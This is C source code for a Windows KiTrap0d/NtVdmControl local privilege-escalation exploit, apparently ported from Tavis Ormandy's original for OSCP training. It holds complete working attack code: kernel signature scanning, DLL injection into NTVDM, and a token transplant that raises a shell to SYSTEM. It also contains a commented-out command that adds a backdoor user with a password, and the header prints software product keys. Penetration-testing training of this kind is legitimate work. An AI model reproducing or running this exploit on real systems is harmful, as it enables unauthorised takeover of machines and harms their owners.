// January 2018 - Trek333 (3TresSoftware)
// 
// --------------------------------------------------------------------------------------
// Windows NT/2K/XP/2K3/VISTA/2K8/7 NtVdmControl()->KiTrap0d local ring0 vulernability
// Windows XP/2K3/VISTA/2K8 NtVdmControl()->KiTrap0d local ring0 exploit
// --------------------------------------------------------------------------------------
//
// ------------------------------------------------------------------------------
// Ported mainly from code by Tavis Ormandy, June 2009 - taviso@sdf.lonestar.org
// GREETZ
//
//      Julien, Lcamtuf, Spoonm, Neel, Skylined, Redpig, and others.
// ------------------------------------------------------------------------------
//
//
// Code ported to use for OSCP training. The comments in code from the last guy or modified for changes.
// Multiple students, comments of code from multiple sources, and the corresponding Metasploit module
// claimed that the exe for this exploit would work across Windows NT/2K/XP/2K3/VISTA/2K8/7
// for low privilege escalation. Hence, it interested me to understand its use
// and verify for all claimed OS versions. As I found out, the exe from these sources did not
// live up to the expectations. Also, statements like the one below gave a sense that it is significant
// exploit for a standalone script. It was a disappoinment to discover that the exploit
// only worked locally on a system. However, code has been added to allow
// exploitation remotely.
//
// A quote found with code:
// "I believe every single release of Windows NT since version 3.1 (1993) up to
// and including Windows 7 (2009) contain this error."
//
// Ported code successfully tested for remote shell execution on the following OS versions:
// XP: SP2/3
// 2K3: SP0/1/2
// VISTA: SP0/1/2
// 2K8: SP1/2
//
// KNOWN BUGS (copied from main source of code)
//
//      * If KernelGetProcByName() ever fails, I'm probably in trouble.
//      * I hardcode several paths instead of expanding %SYSTEMROOT%.
//      * I probably need to VirtualLock() some stuff.
//      * I suspect this is unreliable on mp kernels.
//
// FIXED BUG
//      * Hardcoded paths changed to use %SYSTEMROOT% environment variable
//
// ADDED FEATURE:
//      * Optional command line argument to specify exe to execute with escalated privileges
//
// BuILD INSTRUCTIONS - Windows 2003 x86 Free Build Environment
//
//      C:\> nmake (sounded simple to compile; but it was far from simple. There must be an easier way or not. :( Makefile required for nmake
//      C:\> vdmallowed.exe or C:\> vdmallowed.exe <exe path to execute with escalated privileges>
//
// DEVELOPMENT SYSTEM
//
// Microsoft Windows Server 2003 Standard Edition Service Pack 2
//
// Microsoft Visual Studio 2005 SDK\2007.02
//
// Microsoft Windows Driver Kit (WinDDK) WDK 7600.16385.1
//
// Microsoft Visual Studio 2005 Professional Edition
// Version 8.0.50727.42  (RTM.050727-4200)
// Microsoft .NET Framework
// Version 2.0.50727
//
// Installed Edition: Professional (not all options needed)
//
// Microsoft Visual Basic 2005   77626-009-0000007-41748
// Microsoft Visual Basic 2005
//
// Microsoft Visual C# 2005   77626-009-0000007-41748
// Microsoft Visual C# 2005
//
// Microsoft Visual C++ 2005   77626-009-0000007-41748
// Microsoft Visual C++ 2005
//
// Microsoft Visual J# 2005   77626-009-0000007-41748
// Microsoft Visual J# 2005
//
// Microsoft Visual Web Developer 2005   77626-009-0000007-41748
// Microsoft Visual Web Developer 2005
//
// Crystal Reports    AAC60-G0CSA4B-V7000AY
// Crystal Reports for Visual Studio 2005
//
//
// Visual Studio Package Load Analyzer   1.0
// A utility that analyzes package load failures in Visual Studio 2005.
//
// REQUIRED INPUT FILES
//
// vdmallowed.c
// vdmexploit.c
// Makefile
// FixEnviron.bat - execute before nmake
//
// REQUIRED OUTPUT FILES TO EXECUTE
//
// vdmallowed.exe
// vdmexploit.dll
//
// MISC FILES
//
// set_environment.txt - output of SET command for build environment
// nmake_output.txt - output of nmake execution
//
// WORKAROUND
//
//      Disabling the MSDOS and WOWEXEC subsystems will prevent the exploit
//      from functioning.
//
//      http://support.microsoft.com/kb/220159
//
// Complied (nmake) from the MS Windows WDK 7600.16385.1 Windows 2003 x86 Free Build Environment 
// Environment and update the Include environment variable to the below (see FixEnviron.bat)
//
// set Include=C:\WinDDK\7600.16385.1\inc\api;C:\WinDDK\7600.16385.1\inc\crt;C:\WinDDK\7600.16385.1\inc\ddk;c:\vdm\userh
//
// After significant research, it was found that the code for this exploit
// attempts to combine the DDK(Kernel) and User(SDK/Visual Studio) environments (static libraries 
// - header files) which is not considered a best practice. The same header files exist
// in both environments which causes redefintion complile errors. However, exploits 
// fall outside of best practice anyways. It also does not help one's sanity. 
// The following libs were found to help bridge the gap between the 2 environments for this code that
// Microsoft seemed to go to great lengths to keep separated. Based on some Google research,
// some non-Microsoft compliers seem to go to great lengths to combine the 2 environments.
#pragma comment(lib, "c:\\WinDDK\\7600.16385.1\\lib\\wnet\\i386\\uuid.lib")
#pragma comment(lib, "c:\\WinDDK\\7600.16385.1\\lib\\wnet\\i386\\advapi32.lib")
#pragma comment(lib, "c:\\WinDDK\\7600.16385.1\\lib\\crt\\i386\\libcmt.lib")
#pragma comment(lib, "c:\\WinDDK\\7600.16385.1\\lib\\wnet\\i386\\oldnames.lib")
#pragma comment(lib, "c:\\WinDDK\\7600.16385.1\\lib\\wnet\\i386\\kernel32.lib")

#ifndef WIN32_NO_STATUS
# define WIN32_NO_STATUS // I prefer the definitions from ntstatus.h
#endif
#include <windows.h>
#include <assert.h>
#include <stdio.h>
#include <winerror.h>
// winternl.h filed copied from c:\Program Files\Microsoft Visual Studio 8\VC\PlatformSDK\Include\winternl.h
// to c:\vdm\userh folder to prevent including other USER environment header files which 
// contains duplicate references. 
#include <winternl.h> 
#include <stddef.h>
#include <stdarg.h>
#ifdef WIN32_NO_STATUS
# undef WIN32_NO_STATUS
#endif
#include <ntstatus.h>

#pragma comment(lib, "advapi32")

#define PAGE_SIZE 0x1000

enum { SystemModuleInformation = 11 };

typedef struct {
    ULONG   Unknown1;
    ULONG   Unknown2;
    PVOID   Base;
    ULONG   Size;
    ULONG   Flags;
    USHORT  Index;
    USHORT  NameLength;
    USHORT  LoadCount;
    USHORT  PathLength;
    CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
 
typedef struct {
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
    
// These are generated using kd -kl -c 'db nt!Ki386BiosCallReturnAddress;q'
static CONST UCHAR CodeSignatures[][16] = {
    { "\x64\xA1\x1C\x00\x00\x00\x5A\x89\x50\x04\x8B\x88\x24\x01\x00\x00" }, // Windows NT4
    { "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84" }, // Windows 2000
    { "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84" }, // Windows XP
    { "\xA1\x1C\xF0\xDF\xFF\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00\x00" }, // Windows 2003
    { "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00" }, // Windows Vista
    { "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00" }, // Windows 2008
    { "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00" }, // Windows 7
};

// Log levels.
typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;

BOOL PrepareProcessForSystemToken(PCHAR Application, PDWORD ProcessId);
BOOL SpawnNTVDMAndGetUsefulAccess(PCHAR Application, PHANDLE ProcessHandle);
BOOL InjectDLLIntoProcess(PCHAR DllPath, HANDLE ProcessHandle, PHANDLE RemoteThread);
BOOL LogMessage(LEVEL Level, PCHAR Format, ...);
BOOL ScanForCodeSignature(PDWORD KernelBase, PDWORD OffsetFromBase);

int main(int argc, char **argv)
{
    HANDLE VdmHandle;
    HANDLE RemoteThread;
    DWORD ShellPid;
    DWORD ThreadCode;
    DWORD KernelBase;
    CHAR Buf[32];
    DWORD Offset;
	char * sysroot;
	char * debugpath;
	char * cmdpath;

	LogMessage(L_INFO,
        "\r"
        "--- Trek333 ---------------------------------------\n"
        "Windows XP/2K3/VISTA/2K8 NtVdmControl()->KiTrap0d local ring0 exploit\n"
	"vdmallowed ported from multiple sources \n"
        "---------------------------------------------------\n"
        "\n"
    );
	
	// JB - updated to use environment variable
	// Create paths for vdmexploit.dll, cmd.exe and debug.exe
	sysroot = getenv("SYSTEMROOT");
	debugpath = malloc(strlen(sysroot) + 30);
	strcpy(debugpath,sysroot);
	strcat(debugpath,"\\SYSTEM32\\DEBUG.EXE");
	
    LogMessage(L_INFO, "argc = %i", argc);

	// If no cmdpath in arguments, use cmd.exe
	if (argc < 2) {
		cmdpath = malloc(strlen(sysroot) + 30);
		strcpy(cmdpath,sysroot);
		strcat(cmdpath,"\\SYSTEM32\\CMD.EXE");
	}
	else
	{
		cmdpath = malloc(strlen(argv[1]) + 30);
		strcpy(cmdpath,argv[1]);
	}
    LogMessage(L_INFO, "cmdpath=%s", cmdpath);
    LogMessage(L_INFO, "debugpath=%s", debugpath);

	// Spawn the process to be elevated to SYSTEM.
    LogMessage(L_INFO, "Spawning a shell to give SYSTEM token (do not close it)");

	// JB - use the SYSTEM environment variable path or user argument
    //if (PrepareProcessForSystemToken("C:\\WINDOWS\\SYSTEM32\\NET.EXE user ch33kymix R3!nd33rm1ke /add", &ShellPid) != TRUE) {
    if (PrepareProcessForSystemToken(cmdpath, &ShellPid) != TRUE) {
        LogMessage(L_ERROR, "PrepareProcessForSystemToken() returned failure");
        goto finished;
    }

    // Scan kernel image for the required code sequence, and find the base address.
    if (ScanForCodeSignature(&KernelBase, &Offset) == FALSE) {
        LogMessage(L_ERROR, "ScanForCodeSignature() returned failure");
        goto finished;
    }

    // Pass the parameters required by exploit thread to NTVDM.
    SetEnvironmentVariable("VDM_TARGET_PID", (sprintf(Buf, "%#x", ShellPid), Buf));
    SetEnvironmentVariable("VDM_TARGET_KRN", (sprintf(Buf, "%#x", KernelBase), Buf));
    SetEnvironmentVariable("VDM_TARGET_OFF", (sprintf(Buf, "%#x", Offset), Buf));

    // Invoke the NTVDM subsystem, by launching any MS-DOS executable.
    LogMessage(L_INFO, "Starting the NTVDM subsystem by launching MS-DOS executable");

	// JB - use the SYSTEM environment variable path or user argument
    //if (SpawnNTVDMAndGetUsefulAccess("C:\\WINDOWS\\SYSTEM32\\DEBUG.EXE", &VdmHandle) == FALSE) {
    if (SpawnNTVDMAndGetUsefulAccess(debugpath, &VdmHandle) == FALSE) {
        LogMessage(L_ERROR, "SpawnNTVDMAndGetUsefulAccess() returned failure");
        goto finished;
    }

    // Start the exploit thread in the NTVDM process.
    LogMessage(L_DEBUG, "Injecting the exploit thread into NTVDM subsystem @%#x", VdmHandle);

    if (InjectDLLIntoProcess("VDMEXPLOIT.DLL", VdmHandle, &RemoteThread) == FALSE) {
        LogMessage(L_ERROR, "InjectDLLIntoProcess() returned failure");
        goto finished;
    }

    // Wait for the thread to complete
    LogMessage(L_DEBUG, "WaitForSingleObject(%#x, INFINITE);", RemoteThread);

    WaitForSingleObject(RemoteThread, INFINITE);

    // I pass some information back via the exit code to indicate what happened.
    GetExitCodeThread(RemoteThread, &ThreadCode);

    LogMessage(L_DEBUG, "GetExitCodeThread(%#x, %p); => %#x", RemoteThread, &ThreadCode, ThreadCode);

    switch (ThreadCode) {
        case 'VTIB':
            // A data structure supplied to the kernel called VDM_TIB has to have a `size` field that
            // matches what the kernel expects.
            // Try running `kd -kl -c 'uf nt!VdmpGetVdmTib;q'` and looking for the size comparison.
            LogMessage(L_ERROR, "The exploit thread was unable to find the size of the VDM_TIB structure");
            break;
        case 'NTAV':
            // NtAllocateVirtualMemory() can usually be used to map the NULL page, which NtVdmControl()
            // expects to be present.
            // The exploit thread reports it didn't work.
            LogMessage(L_ERROR, "The exploit thread was unable to map the virtual 8086 address space");
            break;
        case 'VDMC':
            // NtVdmControl() must be initialised before you can begin vm86 execution, but it failed.
            // It's entirely undocumented, so you'll have to use kd to step through it and find out why
            // it's failing.
            LogMessage(L_ERROR, "The exploit thread reports NtVdmControl() failed");
            break;
        case 'LPID':
            // This exploit will try to transplant the token from PsInitialSystemProcess on to an
            // unprivileged process owned by you.
            // PsLookupProcessByProcessId() failed when trying to find your process.
            LogMessage(L_ERROR, "The exploit thread reports that PsLookupProcessByProcessId() failed");
            break;
        case FALSE:
            // This probably means LoadLibrary() failed, perhaps the exploit dll could not be found?
            // Verify the vdmexploit.dll file exists, is readable and is in a suitable location.
            LogMessage(L_ERROR, "The exploit thread was unable to load the injected dll");
            break;
        case 'w00t': 
            // This means the exploit payload was executed at ring0 and succeeded.
            LogMessage(L_INFO, "The exploit thread reports exploitation was successful");
            LogMessage(L_INFO, "w00t! You can now use the shell opened earlier");
            break;
        default:
            // Unknown error. Sorry, you're on your own.
            LogMessage(L_ERROR, "The exploit thread returned an unexpected error, %#x", ThreadCode);
            break;
    }

    TerminateProcess(VdmHandle, 0);
    CloseHandle(VdmHandle);
    CloseHandle(RemoteThread);

finished:
    LogMessage(L_INFO, "Press any key to exit...");
    getch();
    return 0;
}

// Start a process to give SYSTEM token to.
static BOOL PrepareProcessForSystemToken(PCHAR App, PDWORD ProcessId)
{
    PROCESS_INFORMATION pi = {0};
    STARTUPINFO si = { sizeof si };

    if (CreateProcess(App, App, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi) == FALSE) {
        LogMessage(L_ERROR, "CreateProcess(\"%s\") returned failure, %#x", App, GetLastError());
        return FALSE;
    }

    LogMessage(L_DEBUG, "CreateProcess(\"%s\") => %u", App, pi.dwProcessId);

    *ProcessId = pi.dwProcessId;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

// Grab a useful Handle to NTVDM.
static BOOL SpawnNTVDMAndGetUsefulAccess(PCHAR App, PHANDLE ProcessHandle)
{
    PROCESS_INFORMATION pi = {0};
    STARTUPINFO si = { sizeof si };
    ULONG i;

    // Start the child process, which should invoke NTVDM.
    if (CreateProcess(App, App, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, &pi) == FALSE) {
        LogMessage(L_ERROR, "CreateProcess(\"%s\") failed, %#x", App, GetLastError());
        return FALSE;
    }

    LogMessage(L_DEBUG, "CreateProcess(\"%s\") => %u", App, pi.dwProcessId);

    // Get more access
    if ((*ProcessHandle = OpenProcess(PROCESS_CREATE_THREAD
                                        | PROCESS_QUERY_INFORMATION
                                        | PROCESS_VM_OPERATION
                                        | PROCESS_VM_WRITE
                                        | PROCESS_VM_READ
                                        | PROCESS_TERMINATE,
                                      FALSE,
                                      pi.dwProcessId)) == NULL) {
        LogMessage(L_ERROR, "OpenProcess(%u) failed, %#x", pi.dwProcessId, GetLastError());
        TerminateProcess(pi.hProcess, 'SPWN');
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    LogMessage(L_DEBUG, "OpenProcess(%u) => %#x", pi.dwProcessId, *ProcessHandle);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

// Use the DLL Injection technique to access the NTVDM process. 
// http://en.wikipedia.org/wiki/DLL_injection
static BOOL InjectDLLIntoProcess(PCHAR DllPath, HANDLE ProcessHandle, PHANDLE RemoteThread)
{
    PVOID RemotePage;
    LPTHREAD_START_ROUTINE StartRoutine;

    assert(ProcessHandle != INVALID_HANDLE_VALUE);
    assert(DllPath);
    assert(RemoteThread);

    // Allocate a page in the child process
    if ((RemotePage = VirtualAllocEx(ProcessHandle, NULL, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE)) == NULL) {
        LogMessage(L_ERROR, "VirtualAllocEx() returned failure, %#x", GetLastError());
        return FALSE;
    }

    // Write in the name of my DLL (note, memory is already zeroed)
    if (WriteProcessMemory(ProcessHandle, RemotePage, DllPath, strlen(DllPath), NULL) == FALSE) {
        LogMessage(L_ERROR, "WriteProcessMemory(%p) returned failure, %#x", RemotePage, GetLastError());
        return FALSE;
    }

    LogMessage(L_DEBUG, "WriteProcessMemory(%#x, %#x, \"%s\", %u);",
                        ProcessHandle,
                        RemotePage,
                        DllPath,
                        strlen(DllPath));

    // Execute it in child process, loading the specified library
    *RemoteThread = CreateRemoteThread(ProcessHandle,
                                       NULL,
                                       0,
                                       (LPTHREAD_START_ROUTINE)
                                           GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "LoadLibraryA"),
                                       RemotePage,
                                       0,
                                       NULL);

    return *RemoteThread != NULL;
}

// Scan the appropriate kernel image for the correct offset
BOOL ScanForCodeSignature(PDWORD KernelBase, PDWORD OffsetFromBase)
{
    FARPROC NtQuerySystemInformation;
    HMODULE KernelHandle;
    PIMAGE_DOS_HEADER DosHeader;
    PIMAGE_NT_HEADERS PeHeader;
    PIMAGE_OPTIONAL_HEADER OptHeader;
    OSVERSIONINFO osvi = { sizeof osvi };
    PBYTE ImageBase;
    DWORD PhysicalAddressExtensions, DataSize;
    ULONG i;
    HKEY MmHandle;
    SYSTEM_MODULE_INFORMATION ModuleInfo = {0};

    // List of versions I have code signatures for.
    enum {
        MICROSOFT_WINDOWS_NT4   = 0,
        MICROSOFT_WINDOWS_2000  = 1,
        MICROSOFT_WINDOWS_XP    = 2,
        MICROSOFT_WINDOWS_2003  = 3,
        MICROSOFT_WINDOWS_VISTA = 4,
        MICROSOFT_WINDOWS_2008  = 5,
        MICROSOFT_WINDOWS_7     = 6,
    } Version = MICROSOFT_WINDOWS_7;

    // NtQuerySystemInformation can be used to find kernel base address
    NtQuerySystemInformation = GetProcAddress(GetModuleHandle("NTDLL"), "NtQuerySystemInformation");

    // Determine kernel version so that the correct code signature is used
    GetVersionEx(&osvi);
    
    LogMessage(L_DEBUG, "GetVersionEx() => %u.%u", osvi.dwMajorVersion, osvi.dwMinorVersion);

    if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 0)
        Version = MICROSOFT_WINDOWS_NT4;
    if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)
        Version = MICROSOFT_WINDOWS_2000;
    if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)
        Version = MICROSOFT_WINDOWS_XP;
    if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2)
        Version = MICROSOFT_WINDOWS_2003;
    if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0)
        Version = MICROSOFT_WINDOWS_VISTA;
    if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0)
        Version = MICROSOFT_WINDOWS_2008;
    if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1)
        Version = MICROSOFT_WINDOWS_7;

    // Learn the loaded kernel (e.g. NTKRNLPA vs NTOSKRNL), and it's base address
    NtQuerySystemInformation(SystemModuleInformation, &ModuleInfo, sizeof ModuleInfo, NULL);

    LogMessage(L_DEBUG, "NtQuerySystemInformation() => %s@%p",
                        ModuleInfo.Module[0].ImageName,
                        ModuleInfo.Module[0].Base);

    // Load the kernel image specified
    if ((KernelHandle = LoadLibrary(strrchr(ModuleInfo.Module[0].ImageName, '\\') + 1)) == NULL) {
        LogMessage(L_ERROR, "LoadLibrary() returned failure, %#x", GetLastError());
        return FALSE;
    }

    // Parse image headers
    *KernelBase                 = (DWORD) ModuleInfo.Module[0].Base;
    ImageBase                   = (PBYTE) KernelHandle;
    DosHeader                   = (PIMAGE_DOS_HEADER)(ImageBase);
    PeHeader                    = (PIMAGE_NT_HEADERS)(ImageBase + DosHeader->e_lfanew);
    OptHeader                   = &PeHeader->OptionalHeader;

    LogMessage(L_DEBUG, "Searching for kernel %u.%u signature { %02hhx, %02hhx, ... } ...",
                        osvi.dwMajorVersion,
                        osvi.dwMinorVersion,
                        CodeSignatures[Version][0],
                        CodeSignatures[Version][1]);

    // Scan for the appropriate signature
    for (i = OptHeader->BaseOfCode; i < OptHeader->SizeOfCode; i++) {
        if (memcmp(&ImageBase[i], CodeSignatures[Version], sizeof CodeSignatures[Version]) == 0) {
            LogMessage(L_INFO, "Signature found %#x bytes from kernel base", i);

            *OffsetFromBase = i;
            FreeLibrary(KernelHandle);
            return TRUE;
        }
    }

    LogMessage(L_ERROR, "Code not found, the signatures need to be updated for your kernel");
    
    FreeLibrary(KernelHandle);

    return FALSE;
}

// A quick logging routine for debug messages.
// JB - updated with _vsnprintf_s
// BOOL LogMessage(LEVEL Level, PCHAR Format, ...)
BOOL LogMessage(LEVEL Level, LPCSTR Format, ...)
{
	// JB - updated for _vsnprintf_s due to KERNEL/USER environment issue
    //CHAR Buffer[1024] = {0};
	char Buffer[1024] = {0};
	size_t bsize = sizeof(Buffer);
    int a;

	va_list Args;

    va_start(Args, Format);
	    // JB - updated for _vsnprintf_s due to KERNEL/USER environment issue
        //vsnprintf_s(Buffer, sizeof Buffer, _TRUNCATE, Format, Args);
	    a = _vsnprintf_s(Buffer, bsize, _TRUNCATE, Format, Args);
    va_end(Args);

    switch (Level) {
        case L_DEBUG: fprintf(stdout, "[?] %s\n", Buffer); break;
        case L_INFO:  fprintf(stdout, "[+] %s\n", Buffer); break;
        case L_WARN:  fprintf(stderr, "[*] %s\n", Buffer); break;
        case L_ERROR: fprintf(stderr, "[!] %s\n\a", Buffer); break;
    }

    fflush(stdout);
    fflush(stderr);
 
    return TRUE;
}